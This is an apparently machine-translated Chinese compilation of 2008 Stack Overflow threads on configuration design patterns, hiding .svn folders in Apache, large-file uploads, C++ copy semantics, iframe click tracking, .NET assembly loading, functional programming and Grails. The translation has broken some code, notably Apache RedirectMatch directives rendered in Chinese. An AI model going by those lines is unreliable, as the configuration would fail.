> 时间：2008-10-18T12:09:45.260

确实有另一种称为构建器模式的模式正是为此目的。它通常在您有课程时很有用，但每个“配置”选项可能仅在某些组合中是可选的。（[http://en.wikipedia.org/wiki/Builder_pattern](http://en.wikipedia.org/wiki/Builder_pattern)，但这并不能完全描述我的场景）。

您创建了两个类 - 您要构建的类和构建器。builder 类负责确定哪些选项组合是可选的，哪些组合是有意义的，等等。

例如，您想代表沙拉 - 但只有某些成分“味道好”，所以只应该制作那些。

```
Class Salad {
   private Veggie v;
   private Egg e;
   private Meat m;
   // etc etc, lots of properties
   //constructor like this is nice
   Salad(SaladBuilder builder) {
      //query the builder to actually build the salad object. 
      //getVeggie() will either return the supplied value, 
      //or a default if none exists. 
      this.v = builder.getVeggie(); 
      //rest of code omitted
   }

   //otherwise this constructor is fine, but needs a builder.build() method
   Salad(Veggie v, Meat m, Egg e) { //code omitted
   }
}

class SaladBuilder {
   //some default, or left to null depending on what is needed
   private Veggie v = SOME_DEFAULT_VEGGIE;
   private Egg e; 
   private Meat m;
   // etc etc, lots of properties.

   //similar functions for each ingredient, 
   //or combination of ingredients that only make sense together 
   public SaladBuilder addIngredient(Meat m) {
      this.m = m;
      return this;
   }

   public SaladBuilder addIngredient(Veggie v) {
      this.v = v;
      return this;
   }

   public Salad build(){
      // essentially, creates the salad object, but make sure optionals
      // are taken care of here.
      return new Salad(getBeggie(), getMeat(), getEgg());
   }
} 
```

使用示例

```
Salad s = new SaladBuilder().addIngredient(v).addIngredient(m).build(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-18T12:29:22.337

对于打开/关闭功能的选项，我认为装饰器是@Thomas Owens 所说的方式。我更关心改变功能的选项。如果这些操作不能被链接，那么装饰器很多都不能工作。例如，如果您的代码如下所示：

```
public void ActionABC()
{
   if (options.DoA)
   {
      A();
   }

   if (options.DoB)
   {
      B();
   }

   if (options.DoC)
   {
      C();
   }
}

public void ActionCAB()
{
   if (options.DoC)
   {
      C();
   }

   if (options.DoA)
   {
      A();
   }

   if (options.DoB)
   {
      B();
   }
} 
```

这将很难用 Decorator 处理，因为每个 Action 方法的组合顺序不同。

有 20 多个选项，假设它们是开/关的，你就有超过 400 种不同的可能组合。我怀疑并非所有这些组合都有同样的可能性。对于无法通过装饰器处理的事情，您可能需要考虑映射到设置组合的操作模式。仅支持那些最受期待的模式。如果模式的数量很少，您可以使用子类来处理这个问题，然后使用装饰器将功能添加到代表用户选择的模式的子类中。您可以使用工厂根据配置选择和构建适当的类。

本质上，我想我是说您可能需要考虑是否需要与您正在构建的一样多的灵活性和随之而来的复杂性。考虑通过将配置选项折叠成较少数量的更可能使用的模式来减少配置选项的数量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T13:33:55.683

这样的事情呢？

```
IdMap elementsById = (options.useIdAttribute) ? new IdMapImpl() : new NullIdMap();

public Element getElementById(final string id) {
    return elementsById.get(id);
} 
```

基于以下类型：

```
interface IdMap {
    Element get(String id);
}

class NullIdMap implements IdMap {
    public Element get(final String id) {
        throw new Exception(/* Error message */);
    }
}

class IdMapImpl implements IdMap {
    Map<String, Element> elements = new HashMap<String, Element>();

    public Element get(final String id) {
        rejectEmpty(id);
        return elements.get(id.toLowerCase());
    }
} 
```

这里我们使用[NullObject](http://en.wikipedia.org/wiki/Null_Object_pattern)模式来处理禁用 useIdAttribute 的特殊情况。当然有一个折衷 - 解析器类本身更具表现力，而现在有 4 种类型而不是 1 种。这种重构对于 get 方法可能看起来有点过头了，但是当你添加一个 'put()' 方法时等它具有将“特殊情况”逻辑本地化在单个类（NullIdMap）中的好处。

[rejectEmpty 是一个辅助方法，如果传递一个空字符串会抛出异常。]

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T11:52:52.737

我正在考虑一个[命令](http://www.patterndepot.com/put/8/Behavioral.html)模式。

它看起来像：

```
 public class MyClass {

  interface Command {
    void execute(int a);
  }

  static class DoThisSimpleCommand implements Command {
    void execute(int a) {
      // do this simple
    }
  }

  static class DoThisAnotherWayCommand implements Command {
    void execute(int a) {
      // do this another way
    }
  }

  private Command doThisCommand;

  MyClass() {
    initDoThisCommand();
  }

  private void initDoThisCommand() {
    if (config.getDoThisMethod().equals("simple")) {
      doThisCommand = new DoThisSimpleCommand();
    } else {
      doThisCommand = new DoThisAnotherWayCommand();
    }
  }

  void doThis(int a) {
    doThisCommand.execute(a);
  }
} 
```

换句话说; 您将责任委托给您在构造时实例化的实现。现在您的 doThis 只是委托，实际功能被干净地存放在它自己的类中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T12:35:50.403

您打算如何对相互依赖的选项执行规则？如果您可以动态添加选项，如果您使用命令模式，您可能会被迫拥有多个调用程序，或者您可能必须实现一个 case 语句来构建您需要执行的命令。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-21T18:48:07.513

在这里使用诸如策略或策略模式之类的东西可能很有用。这是一种很好的方法来封装或交换基于运行时某些特定数据的配置或（不）存在之类的算法的不同实现。

在您的场景中，如果您的解析类通常具有相同类型的行为（有进有出），但内部算法发生了变化，那么您可能希望以此作为实现的基础。

[http://en.wikipedia.org/wiki/Strategy_pattern](http://en.wikipedia.org/wiki/Strategy_pattern)

# svn - 如何在 Apache 中隐藏目录，特别是源代码控制？

> ID：214886
> 
> 赞同：26
> 
> 时间：2008-10-18T10:51:40.927
> 
> 标签：svn, apache

我想将我的网站保持在版本控制中（特别是 Subversion），并`svn co`在有稳定版本要更新时使用它来更新它，但我担心这样做的安全性，因为所有`.svn`文件夹都是公开的，而且这些包括各种私人数据，尤其是我网站的完整源代码！

我能做些什么来防止这种情况发生吗？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2008-10-18T11:14:05.887

两件事情：

1.  不要将 IfModule 用于您需要在场的功能。可以为自动索引执行此操作，因为它可能不存在并且对方案并不重要。但是你指望重写存在来保护你的内容。因此，最好删除 IfModule 指令并让 apache 告诉您何时不存在重写以启用它（或者至少知道您不会受到“保护”并有意识地评论这些行）

2.  如果您可以访问主配置文件，则无需在那里使用重写，更容易的是其中之一

    ```
    <DirectoryMatch \.svn>
       Order allow,deny
       Deny from all
    </DirectoryMatch> 
    ```

这将生成 403 Forbidden（从 HTTP 合规性的角度来看更好），或者，如果您想通过模糊路由获取安全性，请使用 AliasMatch

```
 AliasMatch \.svn /non-existant-page 
```

如果您无权访问主配置文件，则只能希望启用 mod_rewrite 以在 .htaccess 中使用。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2010-07-08T20:53:37.900

在同样的情况下，我使用`RedirectMatch`, 有两个原因。首先，这是我能找到的唯一一种方法，该方法允许在`.htaccess`该服务器上使用我无法修改的相当严格的配置。我也认为它最干净，因为它允许我告诉 Apache 是的，那里有一个文件，但只是在服务时假装它不是，所以返回 404（而不是 403，它会暴露网站查看者不应该知道的事情） ）。

我现在将以下内容视为我`.htaccess`文件的标准部分：

```
## 完全隐藏一些文件和目录。
重定向匹配 404 "(?:.*)/(?:[.#].*)$"
重定向匹配 404 "(?:.*)~$"
RedirectMatch 404 "(?:.*)/(?:CVS|RCS|_darcs)(?:/.*)?$"

```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-10-18T10:51:51.940

这可以在服务器范围内（推荐）、在单个虚拟主机的基础上实现，或者`.htaccess`如果您的服务器对文件中允许的内容有些许可，甚至可以在文件内部实现。您需要的具体配置是：

```
RewriteEngine On
RewriteRule /\.svn /some-non-existant-404-causing-page

<IfModule autoindex_module>
    IndexIgnore .svn
</IfModule> 
```

第一部分要求`mod_rewrite`. 它强制其中包含“/.svn”的任何请求（即对目录的任何请求，或目录中的任何内容）在*内部*重定向到您网站上不存在的页面。这对最终用户是完全透明的并且无法检测到。它还会强制出现 404 错误，就好像您的`.svn`文件夹刚刚消失一样。

第二部分纯粹是装饰性的，`.svn`如果自动索引模块被激活，它将隐藏文件夹。这也是一个好主意，只是为了防止好奇的灵魂得到任何想法。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-06-03T13:00:17.903

我使用以下内容向用户返回一个简单的 404，而不是显示源代码管理目录实际存在：

重定向匹配 404 /\.(svn|git)(/|$)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-10-18T15:20:55.717

我使用了一种有趣的方法：签出（和更新）在完全独立的目录（可能在完全独立的机器上）上完成，然后将代码复制到网络服务器将使用 rsync 读取它的位置。rsync 命令行上的 --exclude 规则用于使其不复制任何 .svn（和 CVS）目录，而 --delete-excluded 确保即使之前复制了它们也会被删除。

由于 svn update 和 rsync 都进行增量传输，因此即使对于较大的站点，这也相当快。它还允许您将存储库置于防火墙后面。唯一需要注意的是，您必须将所有包含在服务器上生成的文件的目录（例如 Drupal 上的 files/ 目录）移动到 rsync 目标目录之外的位置（以这种方式使用 rsync 将覆盖所有内容），以及指向它的符号链接必须*在 rsync 源目录*中创建。rsync 源目录也可以有其他非版本控制文件（如特定于机器的配置文件）。

我使用的全套 rsync 参数是

```
rsync -vv --rsh='ssh -l username' -rltzpy --exclude .svn/ --exclude CVS/ --exclude Attic/ --delete-after --delete-excluded --chmod=og-w,Fa-x 
```

即使这样，为了冗余，我仍然有一个配置规则来防止 .svn 被访问，它是从 Debian 默认规则中复制的，该规则防止 .ht* (.htaccess, .htpasswd) 被访问。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-18T11:56:51.870

像 Vinko 所说的那样隐藏目录应该可以。[但是使用svn export](http://svnbook.red-bean.com/en/1.5/svn.ref.svn.c.export.html)而不是 svn co可能会更简单。这不应该生成 .svn 目录。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-10-20T11:34:12.913

考虑使用操作系统的包管理工具而不是直接从 VCS 部署实时代码。这将让您确保您的实时包不包含元数据目录或其他可能敏感的工具和数据。

# .net - 如何为用户处理 100mb 的上传

> ID：214888
> 
> 赞同：2
> 
> 时间：2008-10-18T10:53:27.363
> 
> 标签：.net, ftp

有人联系我创建一个定制的 ftp 应用程序，用户将下载该应用程序以便能够上传视频文件（最大 100mb）。

*   他们希望它是白痴证明（即对非计算机知识的人来说很容易）。我假设使用他们的用户名和密码设置像 FileZilla 这样的 ftp 应用程序对于大多数用户来说太过分了。
*   跨平台（哎哟）

当然，我不是第一个解决如何让用户上传大文件的问题的人。想知道是否有人可以给我任何提示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T11:37:51.923

（必须是 FTP 吗？FTP 有防火墙问题，ASCII 模式，当然密码是明文的。）

许多语言都有可用的 FTP 库，您可以使用少量的 UI 胶水将它们串在一起，以制作您自己的简单上传器应用程序。例如 Python 在标准库中有一个 ftplib。上次我这样做是在 C 中使用 Pfau 的 ftplib，例如，但是如果您不介意使用解释器打包应用程序的开销，现代脚本语言将更容易编写。

您的标签中有 .NET…….NET 的标准类库中没有 FTP，但您当然可以免费下载第三方库。另一方面，您说的是跨平台，所以我不确定您是否真的在谈论客户端上的 .NET。

您可以做的是提供多种上传方式，例如在您的站点中内置的基本 HTTP* 文件上传，每个人都知道如何使用，以及为高级用户提供标准的 [S?]FTP 接口，他们将能够操作 FTP 客户端。并不是说操作 FTP 客户端真的*那么*困难：只需告诉他们将 ftp:// URL 粘贴到 Windows 资源管理器中，大多数人应该会没事的。

*：理想情况下使用 AJAX 反馈让用户知道他们的上传进度，和/或可能是 Flash 上传器。并记住关闭/关闭服务器上的任何脚本超时规则，这样它就不会在上传中途放弃。HTTP 上传对于 100MB 量级的文件永远不会是最佳的，但您当然可以在这里改善默认的相当糟糕的浏览器无响应性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-18T10:55:20.980

上传到哪里？

您可以让每个人都安装[Dropbox](http://getdropbox.com)，并从他们都可以访问的企业帐户创建共享。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T10:57:59.913

如果您不希望用户必须提供用户名和密码，您可能需要考虑单点登录策略。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T11:14:56.573

如果用户必须上传大文件，请寻找一种恢复功能。

FTP是唯一的选择吗？如果您可以基于 P2P (bittorrent) 实现某些东西，您可以获得大文件的恢复和完整性功能。

这是我从谷歌搜索 bittorent 库中得到的 2 个

[http://sourceforge.net/projects/libbt/](http://sourceforge.net/projects/libbt/)

[http://www.codeproject.com/KB/cpp/FTKernelAPI.aspx](http://www.codeproject.com/KB/cpp/FTKernelAPI.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T11:46:29.457

用 JS 和 HTML 构建一个简单的 Adob​​e Air 应用程序怎么样？我相信它现在具有 FTP 套接字功能。您还可以使用 DB 中的构建来存储发送到何处、占用空间小、跨平台的详细信息，并且您可以以您感觉最好的方式构建它（flash、flex、JS/HTML）。

我有类似的要求，我正在考虑使用 Adob​​e air 和 jQuery 或 Ext 作为解决方案。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T11:58:44.097

虽然不是 FTP，但您可以尝试使用[swfupload](http://swfupload.org/)通过 HTTP 上传文件。我们使用它大约。在 IIS 上上传 100mb 文件，并且运行良好。

请注意，您必须将 web.config 中的最大请求大小设置为 100 或更多 MB...

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-18T12:03:32.717

上传 100mb 的文件并不比 1kb 的文件复杂。您必须确保接收方（在本例中为服务器）不会尝试将整个文件接收到内存中。服务器可以立即将数据写入磁盘或数据库 CLOB。服务器从输入流读取并写入输出流，只需要很少的资源。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-20T07:46:19.083

谢谢大家，必须说这是我在论坛上得到的最全面的回复。

我想我会建议 2 条路线，比如提到的 bobince

1）http使用SWFUpload（bh213），我以前用过。它非常容易设置并且具有良好的用户体验

2) 然后提供一个 ftp 选项。使用浏览器或类似 filezilla 的东西。

# c++ - 在 C++ 中编写复制构造函数和赋值运算符的清单

> ID：214891
> 
> 赞同：18
> 
> 时间：2008-10-18T10:56:01.760
> 
> 标签：c++, copy-constructor, assignment-operator

请写一个副本构造函数和赋值运算符在 C++ 中需要执行的任务列表，以保持异常安全，避免内存泄漏等。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-18T12:14:53.987

首先确定你真的需要支持副本。大多数情况下并非如此，因此禁用两者是可行的方法。

有时，您仍然需要为多态层次结构中的类提供重复项，在这种情况下：禁用赋值运算符，编写（受保护？）复制构造函数，并提供虚拟 clone() 函数。

否则，如果您正在编写一个值类，您将回到 Coplien 的正交规范形式的领域。如果您有一个无法简单复制的成员，则需要提供一个复制构造函数、一个析构函数、一个赋值运算符和一个默认构造函数。这条规则可以细化，例如参见：[The Law of The Big Two](http://www.artima.com/cppsource/bigtwo.html)

我还建议查看[有关赋值运算符的 C++ 常见问题解答](http://www.parashift.com/c++-faq/assignment-operators.html)，以及[复制和交换成语](http://en.wikibooks.org/wiki/More_C%2B%2B_Idioms/Copy-and-swap)以及[GOTW](http://www.gotw.ca/gotw/059.htm)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-18T16:04:24.493

编译器生成的版本适用于大多数情况。

当您的对象包含 RAW 指针（没有 RAW 指针的参数）时，您需要更加努力地思考这个问题。所以你有一个 RAW 指针，第二个问题是你是否拥有指针（它是否被你删除了）？如果是这样，那么您将需要应用规则 4。

拥有超过 1 个 RAW 指针变得越来越难以正确执行（复杂性的增加也不是线性的 [但这是观察性的，我没有真正的统计数据来支持该陈述]）。因此，如果您有超过 1 个 RAW 指针，请考虑将每个指针包装在自己的类中（某种形式的智能指针）。

4 规则：如果对象是 RAW 指针的所有者，那么您需要定义以下 4 个成员以确保正确处理内存管理：

*   构造函数
*   复制构造函数
*   赋值运算符
*   析构函数

您如何定义这些将取决于具体情况。但需要注意的事项：

*   默认构造：将指针设置为 NULL
*   Copy Constructor：使用Copy and Swap ideum来提供“强异常保证”
*   赋值运算符：检查赋值给 self
*   析构函数：防止异常从析构函数中传播出去。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-11-06T15:56:20.947

尝试阅读此内容。

[http://www.icu-project.org/docs/papers/cpp_report/the_anatomy_of_the_assignment_operator.html](http://www.icu-project.org/docs/papers/cpp_report/the_anatomy_of_the_assignment_operator.html)

是一个很好的赋值算子分析

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2008-10-18T11:30:04.983

我不知道这里安全异常，但我走这条路。让我们想象它是一个模板化的数组包装器。希望能帮助到你 ：）

```
Array(const Array& rhs)
    {
        mData = NULL;
        mSize = rhs.size();
        *this = rhs;
    }

    Array& operator=(const Array& rhs)
    {
        if(this == &rhs)
        {
            return *this;
        }

        int len = rhs.size();

        delete[] mData;

        mData = new T[len];

        for(int i = 0; i < len; ++i)
        {
            mData[i] = rhs[i];
        }

        mSize = len;

        return *this;
    } 
```

# javascript - 你如何确定用javascript点击的html？

> ID：214899
> 
> 赞同：1
> 
> 时间：2008-10-18T11:03:31.823
> 
> 标签：javascript

是否有可能使用 Javascript 或其他一些技术来确定用户单击了哪个超链接，而无需更改超链接源代码。

例如：您是否可以单击“标记”按钮，然后单击托管在不同 iframe 中的超链接，并且能够计算用户单击了哪个超链接，而无需更改该 iframe 中的任何源代码？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T11:22:57.430

使用 jQuery，您可以设置选择的上下文。IE

$('a', $('#iframe-id')).click(function() {...});

然后，您可以实现一个事件处理程序来处理 iFrame 超链接点击。处理程序中的*“this”*属性将允许您查询超链接并获取诸如 innerText 等属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T11:17:23.340

您需要在每个链接上放置一个事件，然后您将获得有关特定点击的所有信息。

这仅适用于某些文档，因此如果您尝试在 iframe 内的链接和页面中的链接之间进行测试，您将不会收到 iframe 链接的事件。

为了附加所有链接的事件，您需要在页面中的所有链接上运行，最好的方法是使用 jQuery 选择器。或其他 js 框架，如 YUI

$("a").click(function () { alert('') });

getElementsByTagName("a") - 将为您提供页面中的所有链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T11:26:55.130

我只是想到了一个解决方案，这是否可行，或者还有其他选择吗？

解决方案是代理 iframe 源页面的内容，用代码替换 href 以调用 javascript 函数，该函数将识别单击了哪个 href。

然后，这可以与标记点击结合使用以准确标记链接。

这也意味着原始来源根本不需要更改。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T11:28:00.727

你需要什么 ？-）

如果您有 iframe，则用作链接的目标，您必须进行一些服务器端处理或在链接的 url 中添加一些内容，以便在页面加载时阅读...

但是检测页面加载时间需要页面中的脚本，即 iframe 内部，或者在短时间内测试 iframe 中页面中元素可用性的函数......

-- 但是只有当页面来自与主页相同的域时，您才能成功，因为跨域脚本是非法的，因此是不可能的！-)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T11:30:01.427

我认为这应该是可能的。可以从外部文档（嵌入 iframe 的页面）访问 IFrame 的内容，因此您应该能够在 iframe 加载后在这些元素上添加事件处理程序（请参阅其他答案）。

另请参阅[Iframe 上的 Wikipedia，](http://en.wikipedia.org/wiki/IFrame)其中提供了一些实际适用于 IFrame 内容的示例和框架。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T12:08:40.443

出于明显的安全原因，您可以将代码注入 iframe，但前提是该 iframe 与您要从中注入的页面位于同一域中。

```
<iframe id="framedpage" src="framedpage.html"></iframe>
<button type="button" id="tagbutton">Tag</button>
<script type="text/javascript">
    function framedclicks_bind() {
        var f= document.getElementById('framedpage');
        var fdoc= f.contentDocument;
        if (!fdoc) fdoc= f.contentWindow.document; // for IE
        if (fdoc)
            for (var i= fdoc.links.length; i-->0;)
                fdoc.links[i].onclick= framedclicks_click; // bind to all links
    }
    function framedclicks_click() {
        alert('You clicked on '+this.href);
        return false; // don't follow link
    }
    document.getElementById('tagbutton').onclick= framedclicks_bind;
</script> 
```

可能需要根据应用程序需要进行清理（例如，确保在尝试绑定之前始终加载框架，或者可能发生解除绑定，或者记住原始链接中的任何点击），但这是一般情况事物的形状。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-20T12:41:47.473

找出点击了哪个元素的好方法是使用*事件委托*。如果使用循环（通过 document.links 或 document.getElementsByTagName）将事件侦听器附加到每个元素，则会遇到两个问题： - 浏览器需要维护许多侦听器 - 事件仅附加到调用 DOM 时的元素环形; 以后动态添加的任何元素都没有事件侦听器。

一个简单的事件委托示例：

```
document.onclick = function(e){
    e = e || window.event;
    var t = e.target || e.srcElement;
    if(t.nodeName=='A'){
        alert( t.href );
    }
} 
```

如果您想在 iframe 中找到点击的链接，只需使用 iframe 的 contentDocument 而不是文档。

# .net - 找不到引用的程序集时如何防止崩溃？

> ID：214903
> 
> 赞同：2
> 
> 时间：2008-10-18T11:10:28.970
> 
> 标签：.net

我有一个使用 Team System API 的小型命令行程序。当机器上未安装正确的 Team System 时，程序会打印带有 System.IO.FileNotFoundException 的回溯，但它也会**崩溃**并显示标准错误消息：

> XXX 遇到问题需要关闭。对此造成的不便，我们表示歉意。

我只想让我的程序在控制台上打印一条“程序需要 Team System 2008”消息并退出而不会崩溃。

据我了解，整个加载过程是在我的 C# 代码的第一行运行之前发生的。有没有办法控制这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T12:23:58.477

.NET 代码是按方法进行 JIT 处理的。您的“主要”方法是否引用了外部库？如果是这样，请考虑：

```
[MethodImpl(MethodImplOptions.NoInlining)]
static int Main() { // add "args" etc if needed
    try {
        return Main2();
    } catch (Exception ex) {
        Console.Error.WriteLine(ex.Message);
        return 1;
    }
}
static int Main2() { // add "args" etc if needed
    // your real code
} 
```

我不能保证它会起作用，但值得一试......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T11:23:08.133

您可以尝试[覆盖 CLR 程序集探测逻辑](http://blogs.msdn.com/junfeng/archive/2006/03/27/561775.aspx)

在 .Net 框架中，当解析程序集引用时，CLR 首先检查 GAC，然后在特定位置搜索应用程序目录。如果程序集不在这些位置之一，CLR 将触发 AssemblyResolve 事件。您可以订阅**AssemblyResolve**事件并使用 Assembly.LoadFrom/LoadFile 等返回程序集。

但是，在您的情况下，您可以只显示您的消息框，然后干净地关闭。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T11:25:44.477

是的。当您第一次使用本身引用要加载的程序集中的类型的类型时，将加载程序集。

所以解决方案是创建一个帮助类来包装与 API 的所有交互。然后将对该包装类的调用包装在 try/catch 中。

就像是：

```
public class Program
{
    static void Main()
    {
        try
        {
            WrapperClass.CallApi(...);
        }
        catch(FileNotFoundException)
        {
            ... you can e.g. show a MessageBox and exit here ... 
        }
    }
}

internal class WrapperClass
{
    public void CallApi(...)
    {
        ... you can reference types from the Team System assembly in WrapperClass
    }
} 
```

# functional-programming - 函数式编程的定义点

> ID：214913
> 
> 赞同：20
> 
> 时间：2008-10-18T11:19:17.047
> 
> 标签：functional-programming

我可以列举函数式编程的许多特性，但是当我的朋友问我你能为我定义函数式编程吗？我不能。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2008-10-18T11:33:23.463

我想说纯函数式编程的定义点是所有计算都在*没有*副作用的函数中完成。也就是说，函数接受输入和返回值，但不改变任何隐藏状态。在这个范式中，函数更接近地模拟它们的数学表亲。

当我开始使用 Erlang 时，我就确定了这一点，Erlang 是一种具有一次写入堆栈的语言。但是，应该澄清的是，编程*范式*和编程*语言*之间是有区别的。通常被称为函数式的语言提供了许多鼓励或强制执行函数式范式的特性（例如，Erlang 的一次写入堆栈、高阶函数、闭包等）。然而，函数式编程范式可以应用于许多语言（有不同程度的痛苦）。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-10-18T14:22:51.420

到目前为止，许多定义都强调了*纯度*，但是有许多语言被认为是函数式的，它们根本不是纯粹的（例如，ML、Scheme）。我认为使语言“功能化”的关键属性是：

1.  高阶函数。函数是一种内置数据类型，与整数和布尔值没有什么不同。匿名函数很容易创建和惯用（例如，lambdas）。
2.  一切都是一种表达。在命令式语言中，语句（改变状态并影响控制流）和表达式（产生值）之间存在区别。在函数式语言（甚至是非纯函数式语言）中，表达式求值是执行的基本单元。

鉴于这两个属性，您自然会得到我们认为是函数的行为（例如，用折叠和映射表示计算）。消除可变状态是一种让事情*变得更加*实用的方法。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-10-18T11:35:40.853

来自[维基百科](http://en.wikipedia.org/wiki/Functional_programming)：

> 在计算机科学中，函数式编程是一种编程范式，它将计算视为对数学函数的评估，并避免了状态和可变数据。它强调函数的应用，与强调状态变化的命令式编程风格形成对比。

使用函数式方法具有以下好处：

*   在函数式语言中，并发编程要容易*得多。*
*   FP 中的函数永远不会产生副作用——这使得单元测试更加容易。
*   生产环境中的热代码部署要容易得多。
*   函数式语言可以用数学方法进行推理。
*   惰性评估为性能优化提供了潜力。
*   更具表现力——闭包、模式匹配、高级类型系统等让程序员更容易“说出他们的意思”。
*   简洁——对于某些类的程序，功能解决方案要简洁得多。

有一篇很棒的文章，[这里](http://www.defmacro.org/ramblings/fp.html)有更多详细信息。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-10-18T18:47:53.847

能够列举特征比试图定义术语本身更有用，因为人们将在各种上下文中使用术语“函数式编程”，在一个连续统一体中具有多种含义，而各个特征具有单独更清晰的定义，得到更普遍的认同。

以下是想到的功能。大多数人使用术语“函数式编程”来指代这些功能的某些子集（最常见/最重要的是“纯度”和“高阶函数”）。

FP特点：

*   **纯度**（又名**不变性**，避免副作用，**引用透明性**）
*   **高阶函数**（例如，将函数作为参数传递，将其作为结果返回，将匿名函数动态定义为 lambda 表达式）
*   **懒惰**（又称**非严格评估**，与纯度相结合时最有用/可用）
*   **代数数据类型**和**模式匹配**
*   **闭包**
*   **柯里化**/**部分应用**
*   **参数多态性**（又名**泛型**）
*   **递归**（由于纯度而更加突出）
*   使用表达式而不是语句进行编程（再次，从纯粹性）
*   ...

您使用的上述列表中的功能越多，就越有可能有人将您正在做的事情标记为“函数式编程”（前两个功能 - 纯度和高阶函数 - 可能值得获得最多的额外奖励积分你的“FP分数”）。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-18T12:21:05.113

我必须补充一点，函数式编程也倾向于抽象程序和域的控制结构 - 例如，您不再对某些事物列表执行“for循环”，而是将其“映射”到某个函数以生成输出。

我认为函数式编程是一种心态以及上面给出的定义。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-08-08T10:33:11.347

有两个独立的定义：

*   Chris Conway 给出了较旧的定义（一等函数）。

*   John Stauffer 给出了较新的定义（避免突变等副作用）。这通常被称为*纯*函数式编程。

这是很多混乱的根源......

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2008-10-18T11:32:40.047

这就像使用矢量而不是位图来绘制图片 - 告诉画家如何更改图片而不是每一步图片的样子。

它是函数的应用，而不是改变状态。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-10-18T13:42:32.500

我认为 John Stauffer 主要有这个定义。我还要补充一点，您需要能够传递函数。本质上，您需要高阶函数，这意味着您可以轻松地传递函数（尽管传递块就足够了）。

例如，一个非常流行的函数调用是 map。基本上相当于

```
list is some list of items
OutList is some empty list
foreach item in list
     OutList.append(function(item))
return OutList 
```

因此代码表示为 map(function, list)。革命性的概念是功能就是功能。Javascript 是具有高阶函数的语言的一个很好的例子。基本上，函数可以被视为变量并传递给函数或从函数返回。C++ 和 C 具有可以类似使用的函数指针。.NET 委托也可以类似地使用。

然后你可以想到各种很酷的抽象......

你有 AddItemsInList、MultiplyItemsInList 等函数吗？
每个函数接受 (List) 并返回一个结果

您可以创建（注意，许多语言不允许您`+`作为函数传递，但这似乎是表达概念的最清晰方式）......

```
AggregateItemsInList(List, combinefunction, StepFunction) 
```

增量函数适用于索引......更好的是使用列表操作（如 next 和 for incTwo next 如果存在）使它们在列表上工作......

```
function incNormal(x) {
  return x + 1
}

function incTwo(x) {
  return x + 2
}

AggregateItemsInList(List, +, incNormal) 
```

想要做其他所有项目吗？

```
AggegateItemsInList(List, +, incTwo) 
```

想要倍增？

```
AggregateItemsInList(List, *, incNormal) 
```

想要将考试成绩加在一起？

```
function AddScores (studenta, studentb) {
   return studenta.score + studentb.score
}

AggregateItemsInList(ListOfStudents, AddScores, incOne) 
```

高阶函数是一个非常强大的抽象。不必为数字、字符串、学生等编写自定义方法。您有一个聚合方法可以循环遍历任何内容的列表，您只需为每种数据类型创建加法操作。

# grails - 访问静态约束时出现 NullPointerException

> ID：214914
> 
> 赞同：1
> 
> 时间：2008-10-18T11:19:59.573
> 
> 标签：grails, groovy

编码

```
${personRequest.constraints.requestStatus.inList} 
```

在我的 gsp 文件中抛出一个`NullPointerException`，但`new PersonRequest().constraints..`有效。为什么？不是`constraints`静态的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T11:20:58.790

[从这里](http://markmail.org/message/3rx6u2e7bg5dz5n5#query:nullpointerexception%20constraints%20gsp%20grails%20inlist+page:1+mid:uru4kl2yq5xg4nio+state:results)复制（grails 用户邮件列表）

> 但是为什么访问静态字段不起作用？
> 
> 因为“约束”静态字段是一个闭包属性。它没有与约束相关的子属性。
> 
> Grails 使用一个约束构建器来评估这个闭包，该构建器监控对不存在的方法的“调用”，即您使用的属性名称：
> 
> ```
> type( inList: [xxxxx]) 
> ```
> 
> ...导致使用包含“inList”==> 某个值的 Map 参数对“type”进行方法调用。
> 
> 根据这些信息，Grails 构建了所有
> 可用约束的列表，并将它们绑定到域类的未来实例。
> 
> 因此，当您静态访问 User.constraints 时，您将获得一个
> 闭包。
> 
